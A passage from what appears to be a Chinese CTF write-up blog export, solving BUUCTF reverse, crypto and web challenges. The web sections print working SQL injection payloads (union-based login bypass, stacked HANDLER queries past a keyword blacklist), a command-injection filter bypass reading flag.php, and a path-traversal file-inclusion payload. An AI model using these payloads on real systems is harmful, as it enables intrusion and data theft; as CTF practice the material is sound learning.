class=\"number\">5759124</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> (a1,a2,a3,a4,a5,a6,a8,a9,a10,a11,a12,a13,a14,a15,a16,a17,a18,a19,a20,a21,a22,a23,a24,a25,a26,a27,a28,a29,a30,a31,a32)</span><br></pre></td></tr></table></figure>\n<p>得到除中间一位的flag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag&#123;e 65421110ba03099a1c039337&#125;</span><br></pre></td></tr></table></figure>\n<p>手动爆破一下，得到第7位是7.<br>flag:<del>flag{e165421110ba03099a1c039337}</del></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">randark@randark-VirtualBox:~/shared$ ./re</span><br><span class=\"line\">input your flag:flag&#123;e165421110ba03099a1c039337&#125;</span><br><span class=\"line\">Correct!</span><br></pre></td></tr></table></figure>\n\n\n\n<hr>\n<p>参考：<br>1.<a href=\"https://www.cnblogs.com/Mayfly-nymph/p/12655622.html\">BUUCTF–[GUET-CTF2019]re</a></p>\n","categories":["Reserve","加壳"]},{"title":"GWCTF 2019-pyre","url":"/2021/09/04/GWCTF%202019-pyre/","content":"<p><a href=\"https://buuoj.cn/challenges#[GWCTF%202019]pyre\">题目链接</a><br>附件是一个pyc文件，尝试使用<a href=\"https://tool.lu/pyc/\">在线工具</a>来解码一下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># visit https://tool.lu/pyc/ for more information</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&#x27;Welcome to Re World!&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&#x27;Your input1 is your flag~&#x27;</span></span><br><span class=\"line\">l = <span class=\"built_in\">len</span>(input1)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(l):</span><br><span class=\"line\">    num = ((input1[i] + i) % <span class=\"number\">128</span> + <span class=\"number\">128</span>) % <span class=\"number\">128</span></span><br><span class=\"line\">    code += num</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(l - <span class=\"number\">1</span>):</span><br><span class=\"line\">    code[i] = code[i] ^ code[i + <span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> code</span><br><span class=\"line\">code = [</span><br><span class=\"line\">    <span class=\"string\">&#x27;\\x1f&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;\\x12&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;\\x1d&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;(&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;0&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;4&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;\\x01&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;\\x06&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;\\x14&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;4&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;,&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;\\x1b&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;U&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;?&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;o&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;6&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;*&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;:&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;\\x01&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;D&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;;&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;%&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;\\x13&#x27;</span>]</span><br></pre></td></tr></table></figure>\n<p>看了一下，不是很复杂，写一个还原脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">code = [<span class=\"string\">&#x27;\\x1f&#x27;</span>,<span class=\"string\">&#x27;\\x12&#x27;</span>,<span class=\"string\">&#x27;\\x1d&#x27;</span>,<span class=\"string\">&#x27;(&#x27;</span>,<span class=\"string\">&#x27;0&#x27;</span>,<span class=\"string\">&#x27;4&#x27;</span>,<span class=\"string\">&#x27;\\x01&#x27;</span>,<span class=\"string\">&#x27;\\x06&#x27;</span>,<span class=\"string\">&#x27;\\x14&#x27;</span>,<span class=\"string\">&#x27;4&#x27;</span>,<span class=\"string\">&#x27;,&#x27;</span>,<span class=\"string\">&#x27;\\x1b&#x27;</span>,<span class=\"string\">&#x27;U&#x27;</span>,<span class=\"string\">&#x27;?&#x27;</span>,<span class=\"string\">&#x27;o&#x27;</span>,<span class=\"string\">&#x27;6&#x27;</span>,<span class=\"string\">&#x27;*&#x27;</span>,<span class=\"string\">&#x27;:&#x27;</span>,<span class=\"string\">&#x27;\\x01&#x27;</span>,<span class=\"string\">&#x27;D&#x27;</span>,<span class=\"string\">&#x27;;&#x27;</span>,<span class=\"string\">&#x27;%&#x27;</span>,<span class=\"string\">&#x27;\\x13&#x27;</span>]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(code)-<span class=\"number\">2</span>,-<span class=\"number\">1</span>,-<span class=\"number\">1</span>):</span><br><span class=\"line\">    code[i] = <span class=\"built_in\">chr</span>(<span class=\"built_in\">ord</span>(code[i])^<span class=\"built_in\">ord</span>(code[i+<span class=\"number\">1</span>]))</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(code)):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>((<span class=\"built_in\">ord</span>(code[i])-i)%<span class=\"number\">128</span>),end=<span class=\"string\">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>\n<p>得到输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">GWHT&#123;Just_Re_1s_Ha66y!&#125;</span><br></pre></td></tr></table></figure>\n<p>flag:<del>GWHT{Just_Re_1s_Ha66y!}</del></p>\n<hr>\n<p>参考：<br>1.<a href=\"https://blog.csdn.net/Palmer9/article/details/105031115/\">re学习笔记（52）BUUCTF-re-[GWCTF 2019]pyre</a></p>\n","categories":["Reserve","Pyc"]},{"title":"GXYCTF2019-BabySQli","url":"/2021/09/01/GXYCTF2019-BabySQli/","content":"<p><a href=\"https://buuoj.cn/challenges#[GXYCTF2019]BabySQli\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>我分配到的主机是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://f42e204a-6420-459d-a0b1-eeffe8b213a0.node4.buuoj.cn:81/</span><br></pre></td></tr></table></figure>\n<p>打开链接，看到这个页面：<br><img src=\"/images/Writeup/20210903210259.png\"><br>测试一下以下数据：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">admin-admin</span><br></pre></td></tr></table></figure>\n<p>不出意外的，被拒绝了。。<br><img src=\"/images/Writeup/20210903210408.png\"><br>用[[Hackbar)看一下post的数据：<br><img src=\"/images/Writeup/20210903210525.png\"><br> <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">name=admin&amp;pw=admin</span><br></pre></td></tr></table></figure><br>尝试一下插入查询数据库语句:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">name=admin&#x27;show databases%23&amp;pw=admin</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;show &#x27;&#x27; at line 1 </span><br></pre></td></tr></table></figure>\n<p>看来是不能用show语句,看看Order by查询:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">name=admin&#x27;Order by 4#&amp;pw=admin</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Writeup/20210903213857.png\"><br>说明数据表应该只有3列，看看union select：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">name=admin&#x27;union select 1,2,3#&amp;pw=admin</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Writeup/20210903214016.png\"><br>确实只有3列数据，看看三列数据分别为什么数据：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">name=1&#x27;union select 1,2,3#&amp;pw=admin //Wrong user!</span><br><span class=\"line\">name=1&#x27;union select 1,&#x27;admin&#x27;,3#&amp;pw=admin //Wrong pass!</span><br></pre></td></tr></table></figure>\n<p>看出第一列应该是数据id，也就是1，而用户名“admin”应该位于第二列，那么第三列应该就是密码了，并且结合题干，应该密码是以MD5的形式储存的。那么尝试使用联合查询插入数据，这里以密码：“pp”为例：<br>先计算“pp”的MD5的值：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">c483f6ce851c9ecd9fb835ff7551737c</span><br></pre></td></tr></table></figure>\n<p>然后构建playload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">name=1&#x27;union select 1,&#x27;admin&#x27;,&#x27;c483f6ce851c9ecd9fb835ff7551737c&#x27;#&amp;pw=pp</span><br></pre></td></tr></table></figure>\n<p>执行后，便可以在返回值里面看到flag。<br>flag:<del>flag{d3a5b24e-78de-4ef0-9bde-86d5c60056db}</del></p>\n<hr>\n<p>参考：<br>1.<a href=\"https://blog.csdn.net/qq_45521281/article/details/107167452\">[GXYCTF2019]BabySQli——“绕过md5比较”</a><br>2.<a href=\"https://www.cnblogs.com/gaonuoqi/p/12355035.html\">[GXYCTF2019]BabySQli</a></p>\n","categories":["Web","PHP代码审计","SQL注入"]},{"title":"GXYCTF2019-CheckIn","url":"/2021/09/24/GXYCTF2019-CheckIn/","content":"<p><a href=\"https://buuoj.cn/challenges#[GXYCTF2019]CheckIn\">题目链接</a></p>\n<span id=\"more\"></span>\n\n<p>附件下载解压，得到一串密文：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">dikqTCpfRjA8fUBIMD5GNDkwMjNARkUwI0BFTg==</span><br></pre></td></tr></table></figure>\n\n<p>先Base64解密一下，得到新的密文：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">v)*L*_F0&lt;&#125;@H0&gt;F49023@FE0#@EN</span><br></pre></td></tr></table></figure>\n\n<p>尝试将所有字符的ASCII值全部偏移，得到flag：</p>\n<p><a href=\"https://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php\">ROT5/13/18/47编码转换</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">ROT47</span>(<span class=\"params\">s1: <span class=\"built_in\">str</span></span>):</span></span><br><span class=\"line\">    s2: <span class=\"built_in\">str</span> = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> letter <span class=\"keyword\">in</span> s1:</span><br><span class=\"line\">        s2 += <span class=\"built_in\">chr</span>(<span class=\"built_in\">ord</span>(letter)+<span class=\"number\">47</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s2</span><br></pre></td></tr></table></figure>\n\n<p>flag:<del>¥XY{Yu_k¬ow_much_about_Rot}</del></p>\n"},{"title":"GXYCTF2019-Ping Ping Ping","url":"/2021/09/01/GXYCTF2019-Ping%20Ping%20Ping/","content":"<p><a href=\"https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>我分配到的主机是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://91427b93-b255-445e-8e96-e75b6234ba1f.node4.buuoj.cn:81/</span><br></pre></td></tr></table></figure>\n<p>这个跟[[ACTF2020 新生赛-Exec)这道题很想，都是基于额外命令的执行，尝试构建playload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?ip=1;ls;</span><br></pre></td></tr></table></figure>\n<p>得到返回：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?ip=</span><br><span class=\"line\"></span><br><span class=\"line\">PING 1 (0.0.0.1): 56 data bytes</span><br><span class=\"line\">flag.php</span><br><span class=\"line\">index.php</span><br></pre></td></tr></table></figure>\n<p>看来flag就在flag.php里面，尝试读取：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?ip=1;cat flag.php;</span><br></pre></td></tr></table></figure>\n<p>但是根据返回，看来是存在关键词黑名单：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?ip= fxck your space!</span><br></pre></td></tr></table></figure>\n<p>尝试使用多命令堆叠执行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?ip=1;u=a;c$ut fl$g.php;</span><br></pre></td></tr></table></figure>\n<p>结果还是一样的返回，看来是还存在空格排除，接着构造playload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?ip=127.0.0.1;e=g;cat$IFS$1fla$e.php</span><br></pre></td></tr></table></figure>\n<p>执行后，看网页源码，就得到了flag：<br><img src=\"/images/Writeup/20210830152906.png\"><br>flag:<del>flag{5b5de8a8-c38d-443d-a242-101255c7ca3c}</del></p>\n","categories":["Web","RCE"]},{"title":"GYCTF2020-Blacklist","url":"/2021/09/01/GYCTF2020-Blacklist/","content":"<p><a href=\"https://buuoj.cn/challenges#[GYCTF2020]Blacklist\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>我分配到的主机是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://6ccfac7a-f644-41bf-a0d8-174b5ad4e554.node4.buuoj.cn:81</span><br></pre></td></tr></table></figure>\n<p>前面都尝试过了，思路跟<kbd>强网杯 2019-随便注</kbd>差不多，但是明显关键词黑名单变多了：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> preg_match(<span class=\"string\">&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i&quot;</span>,<span class=\"variable\">$inject</span>);</span><br></pre></td></tr></table></figure>\n<p>于是，结合搜索引擎查找，找到了可用的playload：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span><span class=\"string\">&#x27;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</span></span><br></pre></td></tr></table></figure>\n<p>flag:<del>flag{94fa6652-22ea-4375-8c5b-103d324321fa}</del></p>\n","categories":["Web","SQL注入"]},{"title":"HCTF 2018-WarmUp","url":"/2021/08/30/HCTF%202018-WarmUp/","content":"<p><a href=\"https://buuoj.cn/challenges#[HCTF%202018]WarmUp\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>我分配到的主机是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://9d7694b9-33a5-44e2-ab9e-f0aebb30f00d.node4.buuoj.cn:81/</span><br></pre></td></tr></table></figure>\n<p>访问，可以发现是一张滑稽：<br><img src=\"/images/Writeup/20210830070115.png\"><br>可以发现源码中出现其他网页：<br><img src=\"/images/Writeup/20210830070224.png\"><br>访问source.php，得到一份php代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">emmm</span></span></span><br><span class=\"line\"><span class=\"class\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"built_in\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkFile</span>(<span class=\"params\">&amp;<span class=\"variable\">$page</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$whitelist</span> = [<span class=\"string\">&quot;source&quot;</span>=&gt;<span class=\"string\">&quot;source.php&quot;</span>,<span class=\"string\">&quot;hint&quot;</span>=&gt;<span class=\"string\">&quot;hint.php&quot;</span>];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (! <span class=\"keyword\">isset</span>(<span class=\"variable\">$page</span>) || !is_string(<span class=\"variable\">$page</span>)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (in_array(<span class=\"variable\">$page</span>, <span class=\"variable\">$whitelist</span>)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable\">$_page</span> = mb_substr(</span><br><span class=\"line\">                <span class=\"variable\">$page</span>,</span><br><span class=\"line\">                <span class=\"number\">0</span>,</span><br><span class=\"line\">                mb_strpos(<span class=\"variable\">$page</span> . <span class=\"string\">&#x27;?&#x27;</span>, <span class=\"string\">&#x27;?&#x27;</span>)</span><br><span class=\"line\">            );</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (in_array(<span class=\"variable\">$_page</span>, <span class=\"variable\">$whitelist</span>)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable\">$_page</span> = urldecode(<span class=\"variable\">$page</span>);</span><br><span class=\"line\">            <span class=\"variable\">$_page</span> = mb_substr(</span><br><span class=\"line\">                <span class=\"variable\">$_page</span>,</span><br><span class=\"line\">                <span class=\"number\">0</span>,</span><br><span class=\"line\">                mb_strpos(<span class=\"variable\">$_page</span> . <span class=\"string\">&#x27;?&#x27;</span>, <span class=\"string\">&#x27;?&#x27;</span>)</span><br><span class=\"line\">            );</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (in_array(<span class=\"variable\">$_page</span>, <span class=\"variable\">$whitelist</span>)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (! <span class=\"keyword\">empty</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;file&#x27;</span>])</span><br><span class=\"line\">        &amp;&amp; is_string(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;file&#x27;</span>])</span><br><span class=\"line\">        &amp;&amp; emmm::checkFile(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;file&#x27;</span>])</span><br><span class=\"line\">    ) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">include</span> <span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;file&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>其中，PHP逻辑运算符：&amp;&amp;表明逻辑–&gt;与，||表明逻辑–&gt;或</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">!<span class=\"keyword\">empty</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;file&#x27;</span>]) <span class=\"comment\"># 要我们的file变量不为空我们先进行分析这段代码 首先看80行第一个要求</span></span><br><span class=\"line\"></span><br><span class=\"line\">is_string(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;file&#x27;</span>]) <span class=\"comment\"># 要求我们传进来的值是字符串类型</span></span><br><span class=\"line\"></span><br><span class=\"line\">emmm::checkFile(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;file&#x27;</span>]) <span class=\"comment\"># 这里将我们的的值传到emmm类里面的checkFile函数</span></span><br></pre></td></tr></table></figure>\n<p>这三个值通过&amp;&amp;逻辑运算符连接，也就是要求这块函数的返回值要全为真，才能执行if里面的文件包含的代码，否则就执行else里面的图片代码。<br>其中源码中还涉及到hint.php这个文件，访问一下看一下：<br><img src=\"/images/Writeup/20210830070816.png\"><br>看来目标就是利用source.php里面体现出来的文件读取的漏洞。<br>总的来说这个cehckFile这个函数进行了 3次白名单检测、 2次问号过滤、一次URL解码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">emmm</span></span></span><br><span class=\"line\"><span class=\"class\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"built_in\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkFile</span>(<span class=\"params\">&amp;<span class=\"variable\">$page</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">//白名单列表</span></span><br><span class=\"line\">            <span class=\"variable\">$whitelist</span> = [<span class=\"string\">&quot;source&quot;</span>=&gt;<span class=\"string\">&quot;source.php&quot;</span>,<span class=\"string\">&quot;hint&quot;</span>=&gt;<span class=\"string\">&quot;hint.php&quot;</span>];</span><br><span class=\"line\">            <span class=\"comment\">//isset()判断变量是否声明is_string()判断变量是否是字符串 &amp;&amp;用了逻辑与两个值都为真才执行if里面的值</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (! <span class=\"keyword\">isset</span>(<span class=\"variable\">$page</span>) || !is_string(<span class=\"variable\">$page</span>)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&quot;you can&#x27;t see it A&quot;</span>;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">//检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (in_array(<span class=\"variable\">$page</span>, <span class=\"variable\">$whitelist</span>)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">//过滤问号的函数(如果$page的值有？则从?之前提取字符串)</span></span><br><span class=\"line\">            <span class=\"variable\">$_page</span> = mb_substr(</span><br><span class=\"line\">                <span class=\"variable\">$page</span>,</span><br><span class=\"line\">                <span class=\"number\">0</span>,</span><br><span class=\"line\">                mb_strpos(<span class=\"variable\">$page</span> . <span class=\"string\">&#x27;?&#x27;</span>, <span class=\"string\">&#x27;?&#x27;</span>)<span class=\"comment\">//返回$page.?里卖弄?号出现的第一个位置</span></span><br><span class=\"line\">            );</span><br><span class=\"line\"></span><br><span class=\"line\">             <span class=\"comment\">//第二次检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (in_array(<span class=\"variable\">$_page</span>, <span class=\"variable\">$whitelist</span>)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">//url对$page解码</span></span><br><span class=\"line\">            <span class=\"variable\">$_page</span> = urldecode(<span class=\"variable\">$page</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//第二次过滤问号的函数(如果$page的值有？则从?之前提取字符串)</span></span><br><span class=\"line\">            <span class=\"variable\">$_page</span> = mb_substr(</span><br><span class=\"line\">                <span class=\"variable\">$_page</span>,</span><br><span class=\"line\">                <span class=\"number\">0</span>,</span><br><span class=\"line\">                mb_strpos(<span class=\"variable\">$_page</span> . <span class=\"string\">&#x27;?&#x27;</span>, <span class=\"string\">&#x27;?&#x27;</span>)</span><br><span class=\"line\">            );</span><br><span class=\"line\">            <span class=\"comment\">//第三次检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (in_array(<span class=\"variable\">$_page</span>, <span class=\"variable\">$whitelist</span>)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>于是构建payload：/index.php?file=hint.php?../../../../../ffffllllaaaagggg<br>最终访问地址是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://03b2cc85-7af4-439b-a06e-41da80ff6505.node3.buuoj.cn/index.php?file=hint.php?../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>\n<p>flag:<del>flag{ea84fa07-6efe-4b7b-aec3-ff4b0eb1780d}</del></p>\n","categories":["Web","PHP代码审计"]},{"title":"HCTF 2018-admin","url":"/2021/08/30/HCTF%202018-admin/","content":"<p><a href=\"https://buuoj.cn/challenges#[HCTF%202018]admin\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>我分配到的主机是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://40532241-a733-4c7a-a380-5d87849c42a9.node4.buuoj.cn</span><br></pre></td></tr></table></figure>\n<p>啥都不说了建议看看这篇：<a href=\"https://blog.csdn.net/weixin_44677409/article/details/100733581\">HCTF2018-admin</a><br><em>这题我要去好好学习了</em></p>\n","categories":["Web","PHP代码审计"]},{"title":"HDCTF2019-Maze","url":"/2021/09/04/HDCTF2019-Maze/","content":"<p><a href=\"https://buuoj.cn/challenges#[HDCTF2019]Maze\">题目链接</a><br>附件下载得到程序，看一下信息：<br><img src=\"/images/Writeup/20210904141916.png\"><br>upx脱壳，拖进IDA看一下：<br><img src=\"/images/Writeup/20210904142235.png\"><br>看来是花指令，看大佬的wp就好。<br>flag:<del>flag{ssaaasaassdddw}</del></p>\n<hr>\n<p>参考：<br>1.<a href=\"https://blog.csdn.net/Palmer9/article/details/104157882\">re学习笔记（34）BUUCTF-re-[HDCTF2019]Maze 花指令去除</a><br>2.<a href=\"https://www.cnblogs.com/pppyyyzzz/p/12873374.html\">[HDCTF2019]Maze</a></p>\n","categories":["Reserve","加壳","花指令"]},{"title":"MRCTF2020-Hello_ misc","url":"/2021/09/11/MRCTF2020-Hello_%20misc/","content":"<p><a href=\"https://buuoj.cn/challenges#[MRCTF2020]Hello_%20misc\">题目链接</a><br>附件下载，发现是一个ELF文件：<br><img src=\"/images/Writeup/20210911212958.png\"><br>拖进IDA看一下主函数：<br><img src=\"/images/Writeup/20210911213010.png\"><br>F5逆向一下，看一下伪代码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> __cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> v4[<span class=\"number\">48</span>]; <span class=\"comment\">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; _    _ _   _ _____ _____   _____           &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;| |  | | | | /  ___|_   _| /  ___|          